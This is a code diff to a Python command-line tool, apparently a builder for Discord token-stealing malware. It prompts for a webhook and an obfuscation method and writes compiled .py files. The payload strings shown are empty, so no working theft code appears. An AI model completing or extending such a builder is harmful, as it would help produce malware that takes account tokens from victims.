@@ -139,41 +139,29 @@ def vexcm():
             error("error with compiler // go to github to post an issue (provide details!)")
     elif cmd.lower() == "compile token":
         checkconfig()
-        filename = input(Fore.YELLOW+f"File Name: ")
-        webhook = input(Fore.YELLOW+f"Webhook: ")
-        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
+        Write.Print("Methods: Strings / Russian\n",Colors.rainbow, interval=0.005)
+        obf = Write.Input(f"Obfuscation Method: ",Colors.rainbow, interval=0.005)
+        filename = Write.Input(f"File Name: ",Colors.rainbow, interval=0.005)
+        webhook = Write.Input(f"Webhook: ",Colors.rainbow, interval=0.005)
+        if obf.lower() == "strings":
+            obftype = random.choices(randomstrings)
+        elif obf.lower() == "russian":
+            obftype = random.choices(russo)
+        Write.Print("[0]: Semi-Securing webhook link\n",Colors.rainbow, interval=0.005)
         sechook = webhook.split("/")
-        print("[0a]: Splitting Webhook")
-        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
+        Write.Print("[0a]: Splitting Webhook\n",Colors.rainbow, interval=0.005)
+        Write.Print("[0b]: Finished Webhook Splitting // basically made secure a lil\n",Colors.rainbow, interval=0.005)
         newlog = open(f"Compiled/{filename}"+".py", "w+")
-        print("[1]: Getting random strings/booleans")
-        print("[2]: Writing File")
-        newlog.write(f"""
+        Write.Print("[1]: Getting random strings/booleans\n",Colors.rainbow, interval=0.005)
+        Write.Print("[2]: Writing File\n",Colors.rainbow, interval=0.005)
+        newlog.write("""
         
         """)
-        print("[/]: File Compiled, sent to Compiled Folder")
+        Write.Print("[/]: File Compiled, sent to Compiled Folder\n",Colors.rainbow, interval=0.005)
         newlog.close()
     elif cmd.lower() == "compile fucker":
         checkconfig()
-        filename = input(Fore.YELLOW+f"File Name: ")
-        webhook = input(Fore.YELLOW+f"Webhook: ")
-        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
-        sechook = webhook.split("/")
-        print("[0a]: Splitting Webhook")
-        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
-        newlog = open(f"Compiled/{filename}"+".py", "w+")
-        print("[1]: Getting random strings/booleans")
-        print("[2]: Writing File")
-        newlog.write(f"""
-#  ================================
-# |         Dex's Compiler         |
-#  ================================
-#  Please do not mess with the code
-#  Reach me on discord dex.lol#1337
-
-'''dex.lol#1377'''
-
-        """)
+        
     elif cmd.lower() == "compile all":
         pass
     elif cmd.lower() == "compilers":
@@ -198,7 +186,7 @@ Vex Compiler Commands | {random.choices(desc)}
         """)
     elif cmd.lower() == "cls" or cmd.lower() == "clear":
         cls()
-        banner()
+        showlogo()
     else:
         error("Unknown command, try again.")
 
